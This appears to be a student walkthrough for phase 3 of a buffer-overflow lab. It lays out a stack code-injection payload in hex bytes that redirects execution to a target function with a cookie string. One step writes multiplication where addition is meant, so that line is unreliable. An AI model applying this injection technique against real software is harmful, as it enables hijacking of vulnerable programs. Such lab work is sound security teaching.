### **Phase 3** 

Phase 2 and 3 are similar but Phase 3 is calling touch3 and you have to pass your cookie as a string.

First, find the addresses of **getbuf** and **touch3**

Getbuf Address: ```0x5553a860```

Touch3 Address: ```0x401e6b```

We need to create the movq instruction similar to **phase2**. However, instead of entering the address of the cookie, we need to enter the address of **getbuf** and add **0x28**.

We add 0x28 because we are adding our buffer, the 8 bytes of %rsp, and the 8 bytes for touch3.

```0x18 + 8 + 8 = 0x28 ```

Add 0x28 to the return address of **getbuf**.

```
0x5553a860 * 0x28 = 0x5553a888
```

Now to construct our attack

1. Add the movq instruct we just made + c3
    * ```48 c7 c7 88 a8 53 55 c3```
2. Add padding for the remaining buffer
3. Add the return address of **getbuf**, in little-endian
4. Add the return address of **touch3**, in little-endian
5. Add the hex translation of your cookie

It should look something like this
```
/* movq location of cookie to rdi and retq */
/* 0x5553a888 */
48 c7 c7 88 a8 53 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Ret address of getbuf:0x5553a860 */
60 a8 53 55 00 00 00 00

/* Ret address of touch3:0x401e6b */ 
6b 1e 40 00 00 00 00 00

/* Hex translation of cookie: 0x33f72ca5 */
33 33 66 37 32 63 61 35 00 
```

Congrats, Phase 3 is complete.